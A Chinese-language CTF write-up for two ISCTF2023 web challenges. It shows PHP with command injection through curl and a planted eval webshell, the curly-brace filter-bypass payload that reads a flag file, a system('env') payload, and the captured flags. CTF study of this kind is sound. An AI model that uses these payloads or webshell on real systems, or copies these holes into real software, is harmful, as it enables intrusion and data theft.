# [个人队伍] ISCTF2023的Writeup

> **2025年12月8日7:00 ~ 2029年10月26日6:05**
>
> **比赛地址：https://gz.imxbt.cn/games/2/challenges**
>
> **复现地址：https://gz.imxbt.cn/games/2/challenges**

> 团队赛
>
> # ISCTF2023复现
>
> **885**支队伍已报名
>
> 开始时间
>
> 2025年12月8日晚上7点00分
>
> 结束时间
>
> 2029年10月26日晚上6点05分
>
> ISCTF2023复现
>
> # 因为技术原因，动态容器的FLAG格式为flag{}不是ISCTF{}
>
> WP请见工具下载网盘，CTRL+F搜索ISCTF2023



# All

## Web

### Fuzz!

#### 题目信息

> ## Fuzz!333 pts
>
> 出题人:Jay17 学校:杭州师范大学
>
> 小蓝鲨说：“你会fuzz吗？”

#### 解题过程

##### 查看题目

```php
<?php
/*
Read /flaggggggg.txt
Hint: 你需要学会fuzz，看着键盘一个一个对是没有灵魂的
知识补充：curl命令也可以用来读取文件哦，如curl file:///etc/passwd
*/
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);
$file = 'file:///etc/passwd';
if(preg_match("/\`|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\\\\|\'|\"|\;|\<|\>|\,|\?|jay/i", $_GET['file'])){
    die('你需要fuzz一下哦~');
}
if(!preg_match("/fi|le|flag/i", $_GET['file'])){
    $file = $_GET['file'];
}
system('curl '.$file);
```

**分析**

- 我们可以用文件协议读取文件：**curl file:///flaggggggg.txt**
- 我们可以用{}和[]和-绕过

##### 编写payload

```shell
?file={f}{i}{l}{e}{:}{/}{/}{/}{f}{l}{a}{ggggggg}{.}{t}{x}{t}
```

##### 发起攻击

```shell
GET file={f}{i}{l}{e}{:}{/}{/}{/}{f}{l}{a}{ggggggg}{.}{t}{x}{t}
```

```shell
ISCTF{Fuzz_is_a_great_trick_Did_you_find_curly_braces?-Jay17}
```

#### 题目答案

##### 核心payload

```shell
GET file={f}{i}{l}{e}{:}{/}{/}{/}{f}{l}{a}{ggggggg}{.}{t}{x}{t}
```

##### 获得答案

```shell
ISCTF{Fuzz_is_a_great_trick_Did_you_find_curly_braces?-Jay17}
```



### Where is the flag

#### 题目信息

> ## Where is the flag351 pts
>
> 出题人:Jay17 学校:杭州师范大学
>
> flag一分为3，散落在各处
>
> 
>
> 由于题目环境FLAG变量不一样，最后拿到的ISCTF{}的FLAG就是答案
>
> 
>
> 但是提交的时候还需要用一串UUID提交

#### 解题过程

##### 查看题目

```php
<?php
//flag一分为3，散落在各处，分别是：xxxxxxxx、xxxx、xxx。
highlight_file(__FILE__);

//标准一句话木马~
eval($_POST[1]);
?>
```

##### 发起攻击

```shell
POST 1=system('env');
```

```shell
GZCTF_FLAG=ISCTF{38a78eb7-5202-43f4-a482-e5e9c7ba9b8b}
```

#### 题目答案

##### 获得答案

```shell
ISCTF{38a78eb7-5202-43f4-a482-e5e9c7ba9b8b}
```



# 队伍

## 名称

**菜鸟对对队**



## 口号

**对对对对对**



## 成员

### 队长

- **probie**

### 队员

- **probie**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**